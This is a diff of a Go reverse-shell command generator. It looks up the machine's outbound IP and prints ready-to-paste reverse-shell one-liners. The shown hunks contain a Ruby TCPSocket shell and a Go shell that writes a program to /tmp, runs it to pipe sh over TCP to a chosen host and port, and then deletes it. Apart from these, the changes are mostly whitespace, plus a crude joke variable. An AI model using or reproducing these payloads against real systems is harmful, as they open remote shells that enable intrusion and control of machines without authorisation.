@@ -15,12 +15,9 @@ letsglow_PRODUCTION
 }*/
 
 //@formatter:off
-
 var denis =     "penis" // i am the ugly formatter from GOland and now i am off
 						// because of this sweet comments
-
 //@formatter:on
-
 // Get preferred outbound ip of this machine
 func supply() net.IP {
 	conn, err := net.Dial("udp", "8.8.8.8:80")
@@ -71,8 +68,9 @@ func supply() net.IP {
 		fmt.Print("ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"", ipa, "\",", choosenP, "))'")
 	case "7", "Golang", "Go", "golang", "go":
 		fmt.Print("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial"+
-			"(\"tcp\",\"", ipa, ":", choosenP, "\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'"+
-			" > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go")
+			"(\"tcp\",\"", ipa, ":", choosenP,
+			"\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'"+
+				" > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go")
 	default:
 		fmt.Print("You chose wrong value or something went wrong! Try again!")
 
